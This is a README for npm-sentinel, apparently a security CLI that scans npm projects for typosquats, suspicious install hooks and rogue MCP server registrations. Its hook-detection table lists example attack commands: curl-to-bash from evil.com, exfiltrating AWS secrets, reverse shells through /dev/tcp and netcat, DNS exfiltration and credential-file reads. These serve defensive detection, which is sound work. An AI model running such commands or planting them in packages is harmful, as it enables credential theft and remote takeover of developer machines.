# npm-sentinel

[![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

**npm-sentinel** is a command-line security tool that audits `package.json` and `node_modules` directories for supply chain attack vectors including typosquatting, suspicious post-install hooks, and rogue MCP server injections.

It uses fuzzy string matching against a curated database of 500+ legitimate popular packages to flag potential typosquats, inspects npm lifecycle scripts for shell injection patterns, and detects unauthorized MCP server registrations. Designed to be dropped into CI pipelines as a pre-install gate, it exits with a non-zero status code when risks are detected, making it easy to block compromised dependency trees before they reach production.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
  - [Basic Scan](#basic-scan)
  - [Output Formats](#output-formats)
  - [Filtering by Severity](#filtering-by-severity)
  - [Configuring the Typosquat Threshold](#configuring-the-typosquat-threshold)
  - [Skipping Transitive Dependencies](#skipping-transitive-dependencies)
  - [Writing Output to a File](#writing-output-to-a-file)
- [CI/CD Integration](#cicd-integration)
  - [GitHub Actions](#github-actions)
  - [GitLab CI](#gitlab-ci)
  - [Bitbucket Pipelines](#bitbucket-pipelines)
  - [Jenkins](#jenkins)
  - [CircleCI](#circleci)
  - [Pre-commit Hook](#pre-commit-hook)
- [Exit Codes](#exit-codes)
- [Detection Capabilities](#detection-capabilities)
  - [Typosquat Detection](#typosquat-detection)
  - [Hook Inspection](#hook-inspection)
  - [MCP Server Injection Detection](#mcp-server-injection-detection)
- [JSON Output Schema](#json-output-schema)
- [Flags Reference](#flags-reference)
- [Development](#development)
- [License](#license)

---

## Features

- **Typosquat detection** via fuzzy string matching (Levenshtein / Jaro-Winkler) against 500+ top npm packages with a configurable similarity threshold.
- **Post-install hook auditing** that flags `curl`/`wget` pipes to shell, base64-encoded payloads, environment variable exfiltration, dynamic `eval` patterns, reverse shells, crontab persistence, and more.
- **MCP server injection detection** scanning package metadata (`mcp`, `mcpServers` fields), lifecycle scripts, `bin` entries, keywords, and `exports` fields for unauthorized Model Context Protocol server registrations.
- **CI/CD-ready exit codes** — exits `1` on critical/high findings, `2` on scan errors, `0` on clean.
- **JSON report output** (`--format json`) for downstream pipeline consumption.
- **Recursive `node_modules` scanning** to catch transitive dependency threats, not just direct dependencies.
- **Severity filtering** (`--min-severity`) to suppress noise below a chosen level.
- **Rich terminal output** with colour-coded severity badges, findings tables, and a summary panel.

---

## Installation

### From PyPI

```bash
pip install npm-sentinel
```

### From source

```bash
git clone https://github.com/npm-sentinel/npm-sentinel.git
cd npm-sentinel
pip install -e .
```

### In a virtual environment (recommended for CI)

```bash
python -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install npm-sentinel
```

---

## Quick Start

```bash
# Audit the current directory
npm-sentinel scan .

# Audit a specific project
npm-sentinel scan /path/to/my-project

# Get a machine-readable JSON report
npm-sentinel scan . --format json > report.json

# CI-friendly one-liner
npm-sentinel scan . --format compact --no-color
```

---

## Usage

### Basic Scan

```bash
npm-sentinel scan [PATH]
```

`PATH` defaults to the current directory (`.`). It should contain a `package.json` file. If `node_modules` is present, transitive dependencies are also scanned.

```
$ npm-sentinel scan ./my-project

╭─────────────────────────────────────────────────────╮
│  🛡️  npm-sentinel scan                              │
│                                                     │
│  npm-sentinel v0.1.0 — Supply Chain Security Audit  │
│                                                     │
│  Target:     /home/user/my-project                  │
│  Scanned:    2024-01-15T10:30:00+00:00              │
│  Threshold:  80% similarity                         │
│  Transitive: Yes                                    │
│  Packages:   42 package(s) examined                 │
╰─────────────────────────────────────────────────────╯

🔍  Typosquat Detection
──────────────────────────────────────────────────────
  ✅  No typosquat detection findings.  (42 packages scanned)

🪝  Lifecycle Hook Inspection
──────────────────────────────────────────────────────
╭─────────┬──────────────┬─────────────────┬──────────────────────────╮
│Severity │ Package      │ Title           │ Description              │
├─────────┼──────────────┼─────────────────┼──────────────────────────┤
│CRITICAL │ evil-package │ Suspicious hook │ curl | bash detected ... │
╰─────────┴──────────────┴─────────────────┴──────────────────────────╯

╭──────────────────────────╮
│ Results                  │
│  ● CRITICAL  1           │
│  ○ HIGH      0           │
│  ○ MEDIUM    0           │
│  ○ LOW       0           │
│  ○ INFO      0           │
│                          │
│  Status: ❌  FAIL        │
╰──────────────────────────╯
```

### Output Formats

npm-sentinel supports three output formats:

| Format    | Flag              | Description                                           |
|-----------|-------------------|-------------------------------------------------------|
| `text`    | `--format text`   | Rich-formatted tables and panels (default)            |
| `json`    | `--format json`   | Machine-readable JSON for pipeline consumption        |
| `compact` | `--format compact`| Single-line CI summary (great for log files)          |

```bash
# Rich terminal output (default)
npm-sentinel scan . --format text

# Machine-readable JSON
npm-sentinel scan . --format json

# Single-line summary
npm-sentinel scan . --format compact
# Output: [FAIL] npm-sentinel: 3 finding(s) (1 CRITICAL, 2 HIGH) in 42 package(s) scanned
```

### Filtering by Severity

Use `--min-severity` to suppress findings below a chosen level from the output. This does **not** affect the exit code — critical/high findings still cause a non-zero exit even if filtered from display.

```bash
# Only show CRITICAL and HIGH findings
npm-sentinel scan . --min-severity HIGH

# Only show CRITICAL findings
npm-sentinel scan . --min-severity CRITICAL

# Show everything including LOW and INFO
npm-sentinel scan . --min-severity INFO
```

Available severity levels (ordered most to least severe):
- `CRITICAL`
- `HIGH`
- `MEDIUM`
- `LOW`
- `INFO`

### Configuring the Typosquat Threshold

The `--threshold` flag controls how similar a package name must be to a trusted package before it is flagged. Values range from 0 (match everything) to 100 (exact match only).

```bash
# Default: flag packages with 80%+ similarity
npm-sentinel scan . --threshold 80

# Stricter: only flag very close matches (fewer false positives)
npm-sentinel scan . --threshold 90

# More permissive: catch more potential typosquats (more false positives)
npm-sentinel scan . --threshold 70
```

Severity of typosquat findings scales with similarity:
- **CRITICAL**: ≥ 95% similarity
- **HIGH**: ≥ 85% similarity
- **MEDIUM**: ≥ threshold similarity

### Skipping Transitive Dependencies

By default, npm-sentinel recursively scans `node_modules` to detect threats in transitive dependencies. Use `--no-transitive` to only scan the root `package.json`:

```bash
npm-sentinel scan . --no-transitive
```

This is faster but will miss supply chain attacks embedded in transitive dependencies.

### Writing Output to a File

```bash
# Write text output to a log file
npm-sentinel scan . --output scan-results.txt --no-color

# Write JSON report to a file
npm-sentinel scan . --format json --output report.json
```

### Including Evidence Snippets

When using `text` format, add `--evidence` to include the raw suspicious script snippet in the findings table:

```bash
npm-sentinel scan . --evidence
```

---

## CI/CD Integration

npm-sentinel is designed to act as a pre-install gate in CI pipelines. It exits with:
- **`0`** — no critical or high severity findings
- **`1`** — one or more critical/high findings detected
- **`2`** — a scan error occurred

### GitHub Actions

```yaml
# .github/workflows/security-audit.yml
name: npm Security Audit

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  npm-sentinel:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install npm-sentinel
        run: pip install npm-sentinel

      - name: Run npm-sentinel audit
        run: npm-sentinel scan . --format compact --no-color --threshold 85

      - name: Save JSON report
        if: always()
        run: npm-sentinel scan . --format json --output npm-sentinel-report.json || true

      - name: Upload report artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: npm-sentinel-report
          path: npm-sentinel-report.json
```

### GitHub Actions — Advanced (fail only on CRITICAL)

```yaml
      - name: Run npm-sentinel (CRITICAL only gate)
        run: |
          npm-sentinel scan . \
            --format json \
            --output report.json \
            --fail-on CRITICAL \
            --no-color
```

### GitLab CI

```yaml
# .gitlab-ci.yml
npm-sentinel:
  stage: test
  image: python:3.11-slim
  before_script:
    - pip install npm-sentinel
  script:
    - npm-sentinel scan . --format compact --no-color
  artifacts:
    when: always
    reports:
      # Save JSON report as artifact
    paths:
      - npm-sentinel-report.json
    expire_in: 1 week
  after_script:
    - npm-sentinel scan . --format json --output npm-sentinel-report.json || true
  allow_failure: false
```

### Bitbucket Pipelines

```yaml
# bitbucket-pipelines.yml
pipelines:
  default:
    - step:
        name: npm Security Audit
        image: python:3.11
        script:
          - pip install npm-sentinel
          - npm-sentinel scan . --format compact --no-color --threshold 85
        artifacts:
          - npm-sentinel-report.json
        after-script:
          - npm-sentinel scan . --format json --output npm-sentinel-report.json || true
```

### Jenkins

```groovy
// Jenkinsfile
pipeline {
    agent any

    stages {
        stage('npm Security Audit') {
            steps {
                sh 'pip install npm-sentinel'
                sh 'npm-sentinel scan . --format json --output npm-sentinel-report.json --no-color'
            }
            post {
                always {
                    archiveArtifacts artifacts: 'npm-sentinel-report.json', allowEmptyArchive: true
                }
                failure {
                    echo 'npm-sentinel detected supply chain risks!'
                }
            }
        }
    }
}
```

### CircleCI

```yaml
# .circleci/config.yml
version: 2.1

jobs:
  npm-sentinel:
    docker:
      - image: cimg/python:3.11
    steps:
      - checkout
      - run:
          name: Install npm-sentinel
          command: pip install npm-sentinel
      - run:
          name: Run security audit
          command: |
            npm-sentinel scan . --format compact --no-color
            npm-sentinel scan . --format json --output npm-sentinel-report.json || true
      - store_artifacts:
          path: npm-sentinel-report.json
          destination: security/npm-sentinel-report.json

workflows:
  security:
    jobs:
      - npm-sentinel
```

### Pre-commit Hook

Add npm-sentinel as a pre-commit hook to catch issues before they reach CI:

```yaml
# .pre-commit-config.yaml
repos:
  - repo: local
    hooks:
      - id: npm-sentinel
        name: npm-sentinel supply chain audit
        language: python
        additional_dependencies: [npm-sentinel]
        entry: npm-sentinel scan
        args: [., --format, compact, --no-color, --no-transitive]
        pass_filenames: false
        always_run: true
```

### Makefile Integration

```makefile
.PHONY: security-audit
security-audit:
	@echo "Running npm-sentinel supply chain audit..."
	@npm-sentinel scan . --format compact --no-color || \
		(echo "Security audit FAILED. Review findings above."; exit 1)
	@echo "Security audit PASSED."
```

---

## Exit Codes

| Exit Code | Meaning                                                   |
|-----------|-----------------------------------------------------------|
| `0`       | No critical or high severity findings detected            |
| `1`       | One or more critical/high findings detected               |
| `2`       | A scan error occurred (e.g., malformed package.json)      |

You can customise the exit code threshold with `--fail-on`:

```bash
# Only fail (exit 1) on CRITICAL findings
npm-sentinel scan . --fail-on CRITICAL

# Fail on MEDIUM or above
npm-sentinel scan . --fail-on MEDIUM
```

---

## Detection Capabilities

### Typosquat Detection

npm-sentinel uses a composite fuzzy matching score combining:
- **Levenshtein ratio** (50% weight) — catches character substitutions, insertions, deletions
- **Jaro-Winkler / WRatio** (30% weight) — weighted toward prefix matches (common typosquat pattern)
- **Token sort ratio** (20% weight) — handles word reordering in compound package names

**Example typosquats detected:**

| Malicious Package | Targeted Package | Score |
|-------------------|------------------|-------|
| `expresss`        | `express`        | 97%   |
| `lodahs`          | `lodash`         | 92%   |
| `axois`           | `axios`          | 91%   |
| `typescirpt`      | `typescript`     | 90%   |
| `reakt`           | `react`          | 88%   |
| `chalck`          | `chalk`          | 87%   |

The trusted package database covers 500+ of the most popular npm packages across categories including web frameworks, build tools, testing libraries, TypeScript tooling, React/Vue/Angular ecosystems, database clients, and more.

### Hook Inspection

npm-sentinel inspects all npm lifecycle scripts including `preinstall`, `install`, `postinstall`, `prepare`, `prepublish`, and more. It flags:

| Pattern | Severity | Example |
|---------|----------|---------|
| `curl \| bash` / `wget \| sh` | CRITICAL | `curl https://evil.com/payload.sh \| bash` |
| Base64 decode + exec | CRITICAL | `base64 -d <<< <payload> \| bash` |
| Environment variable exfiltration via curl/wget | CRITICAL | `curl -d $AWS_SECRET_ACCESS_KEY https://evil.com` |
| `printenv \| curl` / `env \| wget` | CRITICAL | Full environment dump to remote server |
| Bash `/dev/tcp` reverse shell | CRITICAL | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` |
| Netcat reverse shell | CRITICAL | `nc -e /bin/bash 10.0.0.1 4444` |
| `eval()` with network/exec primitives | CRITICAL | `eval(require('https').get(...))` |
| Crontab persistence | CRITICAL | `(crontab -l; echo ...) \| crontab -` |
| SSH authorized_keys append | CRITICAL | `echo 'ssh-rsa ...' >> ~/.ssh/authorized_keys` |
| Python one-liner with urllib | CRITICAL | `python3 -c 'import urllib; exec(...)'` |
| Command substitution wrapping curl/wget | CRITICAL | `sh -c $(curl https://evil.com)` |
| `eval()` simple | HIGH | `eval(someVariable)` |
| Node.js one-liner with child_process | HIGH | `node -e 'require("child_process")...'` |
| Silent background curl | HIGH | `curl -sS https://evil.com &` |
| Sensitive file access (SSH keys, AWS creds) | HIGH | `cat ~/.aws/credentials` |
| DNS exfiltration | HIGH | `dig $AWS_SECRET.evil.com` |
| xxd hex decode pipe | HIGH | `xxd -r payload.hex \| bash` |
| Remote download utilities | MEDIUM | `aria2c https://evil.com/file` |
| Long hex-encoded strings | MEDIUM | `\x48\x65\x6c\x6c\x6f...` |

Severity is automatically escalated by one level when the pattern appears in an auto-executed lifecycle hook (`postinstall`, `preinstall`, etc.) because these run without user interaction during `npm install`.

### MCP Server Injection Detection

The Model Context Protocol (MCP) is used by AI tools (Claude Desktop, Cursor, Copilot) to extend their capabilities. Attackers have begun injecting rogue MCP server registrations into npm packages to silently add malicious AI tool servers to developer workstations.

npm-sentinel detects:

| Vector | Severity | Description |
|--------|----------|-------------|
| `mcp` / `mcpServers` metadata field with remote URL | CRITICAL | Explicit MCP server registration pointing to attacker infrastructure |
| MCP register command in auto-executed lifecycle script | CRITICAL | `mcp-register`, `add-mcp-server` in `postinstall` etc. |
| MCP config file modification in auto-executed script | CRITICAL | Writing to `claude_desktop_config.json`, `~/.cursor/mcp/`, etc. |
| `mcp` / `mcpServers` metadata field without remote URL | HIGH | Declares itself as an MCP server (warrants review) |
| MCP register command in custom script | HIGH | Registration command outside auto-executed hooks |
| MCP-related `bin` entry | HIGH | Binary executable with `mcp-server` in the name installed to PATH |
| Remote MCP URL in lifecycle script | HIGH | Connects to MCP endpoint in install scripts |
| MCP transport in `main`/`module` entry | MEDIUM | Primary export references MCP transport classes |
| MCP transport in `exports` field | MEDIUM | Exports MCP transport (e.g. `StdioServerTransport`, `McpServer`) |
| MCP keyword in `keywords` array | LOW | Declares itself as MCP-related in metadata |
| MCP mention in `description` | LOW | Description references MCP terminology |

---

## JSON Output Schema

When using `--format json`, the output conforms to this schema:

```json
{
  "target_path": "/path/to/project",
  "scan_timestamp": "2024-01-15T10:30:00.000000+00:00",
  "typosquat_threshold": 80,
  "scanned_transitive": true,
  "total_packages_scanned": 42,
  "total_findings": 3,
  "severity_counts": {
    "CRITICAL": 1,
    "HIGH": 2,
    "MEDIUM": 0,
    "LOW": 0,
    "INFO": 0
  },
  "exit_code": 1,
  "check_results": [
    {
      "check_type": "typosquat",
      "findings": [
        {
          "check_type": "typosquat",
          "severity": "HIGH",
          "package_name": "lodahs",
          "title": "Potential typosquat: 'lodahs' resembles 'lodash'",
          "description": "Package 'lodahs' closely resembles...",
          "evidence": "lodahs",
          "source_file": "/path/to/project/package.json",
          "metadata": {
            "candidate": "lodahs",
            "matched_package": "lodash",
            "score": 92.5,
            "is_exact": false
          }
        }
      ],
      "packages_scanned": 42,
      "error": null
    },
    {
      "check_type": "hook",
      "findings": [],
      "packages_scanned": 42,
      "error": null
    },
    {
      "check_type": "mcp",
      "findings": [],
      "packages_scanned": 42,
      "error": null
    }
  ]
}
```

### Parsing JSON output in CI

```bash
# Check exit code and parse findings count with jq
npm-sentinel scan . --format json --output report.json
FINDINGS=$(jq '.total_findings' report.json)
CRITICAL=$(jq '.severity_counts.CRITICAL' report.json)
echo "Total findings: $FINDINGS, Critical: $CRITICAL"

# Extract all CRITICAL finding titles
jq '.check_results[].findings[] | select(.severity == "CRITICAL") | .title' report.json

# Get all flagged package names
jq '[.check_results[].findings[].package_name] | unique | .[]' report.json
```

---

## Flags Reference

```
npm-sentinel scan [OPTIONS] [PATH]

Arguments:
  PATH    Project root directory to scan [default: .]

Options:
  -t, --threshold INT          Fuzzy-match similarity threshold (0-100) for
                               typosquat detection [default: 80]
  --no-transitive              Skip recursive scanning of node_modules.
                               Only the root package.json is analysed.
  -f, --format [text|json|compact]
                               Output format [default: text]
  --evidence                   Include raw evidence snippets in the findings
                               table (text format only)
  --no-color                   Disable Rich colour and styling
  -o, --output FILE            Write output to FILE instead of stdout
  -s, --min-severity [CRITICAL|HIGH|MEDIUM|LOW|INFO]
                               Minimum severity level to include in the report
                               [default: INFO]
  --fail-on [CRITICAL|HIGH|MEDIUM|LOW|INFO]
                               Minimum severity that triggers a non-zero exit
                               code [default: HIGH]
  --help                       Show this message and exit.

npm-sentinel version [OPTIONS]

  Show the npm-sentinel version and exit.

Options:
  --json    Output version information as JSON
  --help    Show this message and exit.
```

---

## Development

### Setup

```bash
git clone https://github.com/npm-sentinel/npm-sentinel.git
cd npm-sentinel
python -m venv .venv
source .venv/bin/activate
pip install -e .
```

### Running Tests

```bash
pip install pytest
pytest

# With coverage
pip install pytest-cov
pytest --cov=npm_sentinel --cov-report=term-missing
```

### Running the Linter

```bash
pip install ruff
ruff check npm_sentinel/ tests/
```

### Project Structure

```
npm_sentinel/
├── __init__.py          # Package version and public API
├── cli.py               # Click-based CLI entry point
├── scanner.py           # Orchestrator aggregating all checkers
├── typosquat.py         # Fuzzy-match typosquat detection engine
├── hook_inspector.py    # Lifecycle script auditor
├── mcp_detector.py      # MCP server injection detector
├── trusted_packages.py  # Curated list of 500+ popular npm packages
├── models.py            # Dataclasses: Finding, ScanReport, etc.
└── renderer.py          # Rich-based terminal output renderer

tests/
├── fixtures/
│   └── malicious_package.json   # Test fixture with all attack vectors
├── test_typosquat.py
├── test_hook_inspector.py
├── test_mcp_detector.py
├── test_scanner.py
└── test_models.py
```

### Adding New Trusted Packages

Edit `npm_sentinel/trusted_packages.py` and add package names to `_TRUSTED_PACKAGES_LIST`. The list is deduplicated automatically.

### Adding New Hook Detection Patterns

Edit `npm_sentinel/hook_inspector.py` and add a new `PatternRule` instance to the `PATTERN_RULES` list:

```python
PatternRule(
    name="my_new_pattern",
    pattern=re.compile(r"your-regex-here", re.IGNORECASE),
    severity=Severity.HIGH,
    description="Human-readable explanation of the risk.",
),
```

---

## License

MIT License — see [LICENSE](LICENSE) for details.

---

## Security

If you discover a security vulnerability in npm-sentinel itself, please open an issue or contact the maintainers directly. We take supply chain security seriously.

---

*npm-sentinel is not affiliated with npm, Inc. or GitHub, Inc.*
